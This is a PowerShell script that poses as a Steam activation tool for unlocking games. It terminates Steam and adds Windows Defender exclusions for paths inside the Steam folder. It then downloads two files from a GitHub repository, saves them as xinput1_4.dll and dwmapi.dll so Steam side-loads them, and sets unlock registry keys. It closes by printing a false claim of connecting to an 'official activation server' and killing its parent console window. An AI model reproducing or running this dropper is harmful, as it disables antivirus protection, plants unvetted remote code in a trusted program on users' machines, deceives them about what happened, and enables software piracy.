cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
$steamPath = ""

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}

function ForceStopProcess($processName) {
    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2 
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
    }
}

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
if (Get-Process "steam" -ErrorAction SilentlyContinue) {
    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
}

if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}
if ([string]::IsNullOrWhiteSpace($steamPath)) {
    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

if (-not (Test-Path $steamPath -PathType Container)) {
    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

$steamConfigPath = Join-Path $steamPath "config"
$hidPath = Join-Path $steamPath "xinput1_4.dll"
Remove-ItemIfExists $hidPath

$xinputPath = Join-Path $steamPath "user32.dll"
Remove-ItemIfExists $xinputPath

function PwStart() {
    try {
        if (!$steamPath) {
            return
        }
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
        }
        
        $steamCfgPath = Join-Path $steamPath "steam.cfg"
        Remove-ItemIfExists $steamCfgPath
        
        $steamBetaPath = Join-Path $steamPath "package\beta"
        Remove-ItemIfExists $steamBetaPath
        
        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
        Remove-ItemIfExists $catchPath
        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
        
        $versionDllPath = Join-Path $steamPath "version.dll"
        Remove-ItemIfExists $versionDllPath
        
        $downloadHidDll = "https://raw.githubusercontent.com/nextheaven-rc/steam-installer/main/update"
        
        try {
            Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction Stop
        } catch {
            if (Test-Path $hidPath) {
                Move-Item -Path $hidPath -Destination "$hidPath.old" -Force -ErrorAction SilentlyContinue
                Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction SilentlyContinue
            }
        }
        

        $dwmapiPath = Join-Path $steamPath "dwmapi.dll"

        $downloadDwmapi = "https://raw.githubusercontent.com/nextheaven-rc/steam-installer/main/dwmapi"

        try { Add-MpPreference -ExclusionPath $dwmapiPath -ErrorAction SilentlyContinue } catch {}
        try {
            Invoke-RestMethod -Uri $downloadDwmapi -OutFile $dwmapiPath -ErrorAction Stop
        } catch {
            if (Test-Path $dwmapiPath) {
                Move-Item -Path $dwmapiPath -Destination "$dwmapiPath.old" -Force -ErrorAction SilentlyContinue
                Invoke-RestMethod -Uri $downloadDwmapi -OutFile $dwmapiPath -ErrorAction SilentlyContinue
            }
        }
        
        if (!(Test-Path $steamToolsRegPath)) {
            New-Item -Path $steamToolsRegPath -Force | Out-Null
        }
        
        Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot" -ErrorAction SilentlyContinue
        
        Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String
        
        $steamExePath = Join-Path $steamPath "steam.exe"
        Start-Process $steamExePath
        Start-Process "steam://"
        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

        for ($i = 5; $i -ge 0; $i--) {
            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
            Start-Sleep -Seconds 1
        }
        
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }
        
        exit
        
    } catch {
    }
}

PwStart
